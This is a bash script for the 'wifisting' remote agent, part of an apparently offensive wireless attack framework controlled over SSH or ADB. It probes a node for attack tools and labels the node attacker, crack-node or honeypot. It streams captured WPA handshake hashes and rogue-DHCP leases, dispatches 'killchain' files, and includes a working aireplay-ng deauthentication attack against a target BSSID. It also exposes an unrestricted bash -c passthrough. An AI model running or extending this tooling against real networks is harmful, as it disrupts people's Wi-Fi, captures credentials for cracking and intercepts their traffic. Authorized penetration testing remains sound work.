#!/usr/bin/env bash
# wifisting remote agent — runs ON the remote node.
# Called by 31_remote_node.sh via SSH or ADB.
# Subcommands:
#   --probe                 emit ROLES/CAPS/IFACES/... as TSV
#   --stream                continuous event stream on stdout
#   --attack CHAIN BSSID D [--iface IF]
#   --nexmon-install        (phone) install nexmon_csi
#   --exec CMD              run an arbitrary command (used for pkill, etc.)
set -u

AGENT_STATE="/tmp/wifisting_agent"
mkdir -p "$AGENT_STATE" 2>/dev/null || true

# ---------- capability detection ----------

ag_has() { command -v "$1" >/dev/null 2>&1; }
ag_iface_exists() { [ -e "/sys/class/net/$1" ]; }

ag_detect_os() {
    if [ -f /etc/os-release ]; then
        # shellcheck disable=SC1091
        . /etc/os-release
        printf '%s\n' "${ID:-linux}"
    else
        printf 'unknown\n'
    fi
}

ag_detect_distro() {
    if [ -f /etc/os-release ]; then
        # shellcheck disable=SC1091
        . /etc/os-release
        printf '%s\n' "${PRETTY_NAME:-${ID:-linux}}"
    else
        printf 'unknown\n'
    fi
}

# Find wireless interfaces (any type)
ag_list_wireless() {
    local out=()
    for d in /sys/class/net/*; do
        [ -e "$d/wireless" ] || continue
        out+=("$(basename "$d")")
    done
    if [ "${#out[@]}" -eq 0 ]; then
        printf 'none\n'
    else
        ( IFS=','; printf '%s\n' "${out[*]}" )
    fi
}

# What kind of node is this?
ag_detect_roles() {
    local roles=()

    # attacker: has monitor-capable wifi + aireplay
    local wifi
    wifi=$(ag_list_wireless)
    if [ "$wifi" != "none" ] && ag_has aireplay-ng && ag_has airodump-ng; then
        roles+=("attacker")
    fi

    # crack-node: has hashcat or john
    if ag_has hashcat || ag_has john; then
        roles+=("crack-node")
    fi

    # honeypot: has hostapd and a managed iface
    if ag_has hostapd && [ "$wifi" != "none" ]; then
        roles+=("honeypot")
    fi

    # sensor: can run tshark / tcpdump (passive only)
    if ag_has tshark || ag_has tcpdump; then
        roles+=("sensor")
    fi

    if [ "${#roles[@]}" -eq 0 ]; then
        printf 'bare\n'
    else
        ( IFS=','; printf '%s\n' "${roles[*]}" )
    fi
}

# What can this node actually do?
ag_detect_caps() {
    local caps=()
    ag_has tshark && caps+=("tshark")
    ag_has tcpdump && caps+=("tcpdump")
    ag_has hashcat && caps+=("hashcat")
    ag_has john && caps+=("john")
    ag_has hostapd && caps+=("ap-mode")
    ag_has airodump-ng && caps+=("monitor")
    ag_has aireplay-ng && caps+=("injection")
    ag_has hcxdumptool && caps+=("pmkid")
    ag_has btlejack && caps+=("ble")
    ag_has gpspipe && caps+=("gps")
    [ -d /opt/Responder ] && caps+=("responder")

    if [ "${#caps[@]}" -eq 0 ]; then
        printf 'none\n'
    else
        ( IFS=','; printf '%s\n' "${caps[*]}" )
    fi
}

# ---------- probe ----------

ag_probe() {
    printf 'ROLES\t%s\n'     "$(ag_detect_roles)"
    printf 'CAPS\t%s\n'      "$(ag_detect_caps)"
    printf 'IFACES\t%s\n'    "$(ag_list_wireless)"
    printf 'HOSTNAME\t%s\n'  "$(hostname 2>/dev/null || echo unknown)"
    printf 'UNAME\t%s\n'     "$(uname -sr 2>/dev/null || echo unknown)"
    printf 'OS\t%s\n'        "$(ag_detect_os)"
    printf 'DISTRO\t%s\n'    "$(ag_detect_distro)"
    printf 'KERNEL\t%s\n'    "$(uname -r 2>/dev/null || echo unknown)"
    printf 'AGENT_VERSION\t1\n'
}

# ---------- event stream ----------
# Tails everything that might be interesting and emits TSV lines.
# Format: event_type<TAB>timestamp<TAB>payload...

ag_event() {
    local type="$1"; shift
    printf '%s\t%s\t%s\n' "$type" "$(date +%s)" "$*"
}

ag_stream() {
    ag_event AGENT_START "$(hostname)"

    # Watch for new captures / handshakes / hosts
    local last_hash=""
    while true; do
        # Report any handshake files appearing
        for f in /tmp/wifisting/attack/*.22000 /tmp/wifisting/*.22000; do
            [ -f "$f" ] || continue
            [ "$f" = "$last_hash" ] && continue
            last_hash="$f"
            ag_event HASH "$f" "$(stat -c%s "$f" 2>/dev/null || echo 0)"
        done

        # Report interface state changes
        for d in /sys/class/net/*; do
            [ -e "$d/wireless" ] || continue
            local name
            name=$(basename "$d")
            if ag_has iw; then
                local mode
                mode=$(iw dev "$name" info 2>/dev/null | awk '/type/ {print $2; exit}')
                ag_event IFACE "$name" "$mode"
            fi
        done

        # Report any hosts acquired via rogue DHCP
        if [ -f /tmp/wifisting/rogue_dhcp/leases ]; then
            while read -r ts mac ip host _; do
                [ -z "$mac" ] && continue
                ag_event LEASE "$mac" "$ip" "${host:-}"
            done < /tmp/wifisting/rogue_dhcp/leases
        fi

        sleep 5
    done
}

# ---------- attack dispatch ----------
# Runs a killchain-style TSV file locally.

ag_attack() {
    local chain="$1" bssid="${2:-}" duration="${3:-60}"
    [[ -z "$chain" ]] && { printf 'ERROR\tchain required\n' >&2; return 2; }
    [ -f "$chain" ] || { printf 'ERROR\tchain file not found: %s\n' "$chain" >&2; return 1; }

    # Export the target so any killchain steps that read $TARGET_BSSID see it
    export TARGET_BSSID="$bssid"
    export TARGET_CHANNEL="${TARGET_CHANNEL:-6}"

    if [ -n "$bssid" ]; then
        mkdir -p /tmp/wifisting
        printf '%s\n' "$bssid" > /tmp/wifisting/target_bssid
    fi

    # Prefer the local killchain runner if it exists
    if [ -f "$HOME/wifisting/modules/29_killchain.sh" ]; then
        bash "$HOME/wifisting/modules/29_killchain.sh" --run "$chain"
        return $?
    fi

    # Fallback: parse the TSV and run each step manually (limited set)
    local step_id step_arg
    while IFS=$'\t' read -r key id arg; do
        [ "$key" = "step" ] || continue
        step_id="$id"
        step_arg="${arg:-}"
        printf 'STEP\t%s\t%s\n' "$step_id" "$step_arg"
        case "$step_id" in
            deauth_bcast)
                timeout 10 aireplay-ng --deauth 10 -a "$bssid" \
                    "$(ag_list_wireless | cut -d, -f1)" 2>/dev/null || true
                ;;
            sleep_n)
                sleep "${step_arg:-5}"
                ;;
            *)
                printf 'SKIP\t%s\t(no local handler)\n' "$step_id"
                ;;
        esac
        printf 'DONE\t%s\n' "$step_id"
    done < "$chain"
    printf 'CHAIN_DONE\n'
}

# ---------- nexmon (phone only) ----------

ag_nexmon_install() {
    ag_event NEXMON_START
    if ! ag_has git; then
        printf 'ERROR\tgit missing\n' >&2; return 1
    fi
    local d="$HOME/nexmon_csi"
    [ -d "$d" ] || git clone https://github.com/seemoo-lab/nexmon_csi.git "$d" || {
        printf 'ERROR\tclone failed\n' >&2; return 1
    }
    printf 'CLONED\t%s\n' "$d"
    printf 'HINT\tfollow %s/README.md — requires rooted phone\n' "$d"
    ag_event NEXMON_DONE
}

# ---------- exec ----------
# Arbitrary command passthrough — used by rn_attack_stop and similar.

ag_exec() {
    bash -c "$*"
}

# ---------- dispatch ----------

case "${1:-}" in
    --probe)           ag_probe ;;
    --stream)          ag_stream ;;
    --attack)          shift; ag_attack "$@" ;;
    --nexmon-install)  ag_nexmon_install ;;
    --exec)            shift; ag_exec "$@" ;;
    *)
        cat >&2 <<EOF
wifisting remote agent v1
usage:
  $0 --probe
  $0 --stream
  $0 --attack CHAIN [BSSID] [DURATION]
  $0 --nexmon-install
  $0 --exec "CMD"
EOF
        exit 2 ;;
esac
